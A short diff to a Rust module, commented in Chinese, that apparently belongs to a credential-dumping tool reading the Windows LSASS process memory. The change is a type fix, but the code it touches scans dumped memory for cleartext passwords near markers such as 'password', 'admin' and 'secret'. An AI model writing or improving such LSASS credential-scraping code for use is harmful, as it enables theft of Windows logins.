@@ -9,7 +9,6 @@
 //! 3. 使用Windows API（OpenProcess + MiniDumpWriteDump）
 
 use crate::cred::{Credential, CredType};
-use std::collections::HashMap;
 
 /// 从LSASS进程提取凭据
 ///
@@ -355,13 +354,13 @@ fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
     let mut results = Vec::new();
 
     // 搜索常见密码前置字符串
-    let password_markers = [
+    let password_markers: &[&[u8]] = &[
         b"password", b"Password", b"PASSWORD",
         b"passwd", b"pwd",
         b"cleartext", b"clear-text",
     ];
 
-    for marker in &password_markers {
+    for marker in password_markers {
         for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
             let pos = found.0;
             let end = std::cmp::min(pos + 512, data.len());
@@ -377,11 +376,11 @@ fn find_cleartext_passwords(data: &[u8]) -> Vec<(String, String)> {
     }
 
     // 通用搜索：查找位于 "user" "login" "admin" 等词附近的ASCII/Unicode字符串
-    let context_markers = [
+    let context_markers: &[&[u8]] = &[
         b"user", b"admin", b"login", b"credential", b"secret",
     ];
 
-    for marker in &context_markers {
+    for marker in context_markers {
         for found in data.windows(marker.len()).enumerate().filter(|(_, w)| *w == *marker) {
             let pos = found.0;
             let search_range = if pos > 1024 { pos - 1024 } else { 0 };
